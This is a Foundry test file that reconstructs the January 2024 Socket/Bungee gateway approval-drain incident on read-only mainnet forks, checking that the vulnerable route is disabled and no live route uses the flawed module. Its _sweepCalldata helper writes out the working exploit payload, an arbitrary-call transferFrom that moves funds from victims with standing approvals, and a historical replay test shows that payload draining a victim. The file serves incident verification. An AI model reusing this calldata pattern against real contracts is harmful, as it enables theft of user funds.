// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20, ISocketGateway, ISocketSwapImpl} from "../src/C34.sol";

/// @title C-34 Socket/Bungee gateway live-extractability PoC
/// @notice Read-only fork tests. No mainnet transactions are ever sent.
/// Incident: 2024-01-16. Route 406 (WrappedTokenSwapperImpl 0xcc5fda5e…) let any caller run
/// `performAction(fromToken, toToken, amount=0, receiver, metadata, swapExtraData)` through the
/// gateway; the module then called `fromToken.call(swapExtraData)` as the gateway, so
/// `transferFrom(victim, attacker, X)` drained standing approvals. Route 406 was disabled at
/// block 19,021,526 (15 min after the attack).
contract SocketC34Test is Test {
    address constant GW = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes32 constant VULN_IMPL_CODEHASH = 0x2deac76a78f4a24cbd590fd5ae30847eed4a064c91ae2dc18a4aa7f7f01293e0;

    ISocketGateway constant gw = ISocketGateway(GW);

    function _rpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
    }

    function setupFork(string memory rpc) external {
        vm.createSelectFork(rpc);
    }

    function setupForkAt(string memory rpc, uint256 blockNumber) external {
        vm.createSelectFork(rpc, blockNumber);
    }

    /// @dev Faithful 2024-01-16 calldata shape: fromToken=USDC, toToken=NATIVE, amount=0,
    /// swapExtraData = transferFrom(victim, attacker, amount) executed by the gateway.
    function _sweepCalldata(address victim, address receiver, uint256 amount) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            ISocketSwapImpl.performAction.selector,
            USDC,
            NATIVE,
            uint256(0),
            receiver,
            bytes32(0),
            abi.encodeWithSelector(bytes4(0x23b872dd), victim, receiver, amount)
        );
    }

    /// @notice Live: route 406 is the disabled sentinel; the sweep reverts RouteDisabled().
    function test_socket_live_route406_disabled_and_reverts() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        assertEq(gw.routes(406), gw.disabledRouteAddress(), "route 406 not disabled");
        assertEq(gw.routes(386), gw.disabledRouteAddress(), "route 386 not disabled");

        address victim = makeAddr("victim");
        address sink = makeAddr("sink");
        deal(USDC, victim, 1_000e6);
        vm.prank(victim);
        IERC20(USDC).approve(GW, type(uint256).max);

        vm.expectRevert(bytes4(0x17d0b6db)); // RouteDisabled()
        gw.executeRoute(406, _sweepCalldata(victim, sink, 1_000e6));
        assertEq(IERC20(USDC).balanceOf(victim), 1_000e6, "victim lost funds");
        assertEq(IERC20(USDC).balanceOf(sink), 0, "sink received funds");
    }

    /// @notice Live: no enabled route points at the vulnerable module bytecode.
    function test_socket_live_no_route_uses_vulnerable_impl() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        uint256 count = gw.routesCount();
        uint256 live;
        for (uint32 i = 0; i < count; i++) {
            address impl = gw.routes(i);
            if (impl == address(0) || impl == gw.disabledRouteAddress()) continue;
            live++;
            assertTrue(impl.codehash != VULN_IMPL_CODEHASH, "a live route uses the vulnerable module");
        }
        emit log_named_uint("live routes checked", live);
        assertGt(live, 0, "no live routes enumerated");
    }

    /// @notice Live: the enabled ZeroxV2 swap route (434) cannot move a victim's gateway approval,
    /// because every transferFrom it performs uses msg.sender as `from`.
    function test_socket_live_zeroxv2_route_cannot_sweep_victim() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        address victim = makeAddr("victim2");
        address sink = makeAddr("sink2");
        deal(USDC, victim, 1_000e6);
        vm.prank(victim);
        IERC20(USDC).approve(GW, type(uint256).max);

        (bool ok, ) = GW.call(
            abi.encodeWithSelector(ISocketGateway.executeRoute.selector, uint32(434), _sweepCalldata(victim, sink, 1_000e6))
        );
        // Whether the aggregator call reverts or no-ops, the victim's approval is untouched.
        assertEq(IERC20(USDC).balanceOf(victim), 1_000e6, "victim lost funds via route 434");
        assertEq(IERC20(USDC).balanceOf(sink), 0, "attacker extracted funds via route 434");
        emit log_named_string("route 434 call success", ok ? "true (no-op)" : "reverted");
    }

    /// @notice Historical replay: at block 19,021,000 (before disable at 19,021,526) route 406 was
    /// live and the sweep extracted a victim's standing approval. This proves the mechanism.
    function test_socket_historical_route406_sweep() public {
        string[] memory candidates = new string[](4);
        candidates[0] = vm.envOr("NODEREAL_ETH_RPC_URL", string(""));
        candidates[1] = vm.envOr("BLOCKPI_RPC_URL", string(""));
        candidates[2] = vm.envOr("RPC_URL", string(""));
        candidates[3] = _rpc();
        if (!this.tryArchiveFork(candidates, 19_021_000)) {
            vm.skip(true);
        }
        assertEq(gw.routes(406), 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e, "route 406 not the vulnerable module");

        address victim = makeAddr("victimHistoric");
        address sink = makeAddr("sinkHistoric");
        deal(USDC, victim, 1_000e6);
        vm.prank(victim);
        IERC20(USDC).approve(GW, type(uint256).max);

        gw.executeRoute(406, _sweepCalldata(victim, sink, 1_000e6));
        assertEq(IERC20(USDC).balanceOf(sink), 1_000e6, "sweep failed on historical fork");
        assertEq(IERC20(USDC).balanceOf(victim), 0, "victim funds not drained");
    }

    function tryArchiveFork(string[] calldata rpcs, uint256 blockNumber) external returns (bool) {
        for (uint256 i; i < rpcs.length; i++) {
            if (bytes(rpcs[i]).length == 0) continue;
            try this.setupForkAt(rpcs[i], blockNumber) {
                return true;
            } catch {}
        }
        return false;
    }
}
